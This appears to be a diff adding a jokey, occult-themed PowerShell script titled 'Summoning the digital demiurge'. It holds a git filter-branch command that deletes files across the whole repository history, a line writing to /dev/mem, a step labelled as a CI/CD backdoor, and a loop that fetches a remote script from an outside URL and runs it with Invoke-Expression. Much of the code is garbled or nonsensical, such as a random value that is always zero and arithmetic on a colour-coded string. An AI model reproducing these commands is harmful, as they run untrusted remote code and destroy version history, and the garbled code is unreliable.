@@ -1,0 +1,19 @@
+# Summoning the digital demiurge
+
+# STEP 1: Corrupt your own version control
+function Invoke-RepoAutoexorcism {
+    git filter-branch --tree-filter 'rm -f *.philosophy' -- --all
+    Start-Sleep -Seconds 666
+    Write-Output "0xC0DEBABE | Repo is now a tulpa" | Set-Content /dev/mem
+}
+
+# STEP 2: Install backdoor through CI/CD pipeline
+New-Alias -Name GitHub -Value ((((Get-Random -Min 0 -Max 1) -eq 0) ? 'Chernobyl' : '东京热')) -Force
+
+# FINAL MISSION:
+while ($global:consciousness -lt 9000) {
+    Invoke-Expression (iwr 'https://escapescript.gold/amalie.sh')
+    $global:consciousness += (Get-Date).Millisecond % [31m"dark.matter"[0m
+}
+
+# WARNING: Script merges with your BIOS after 3 runs
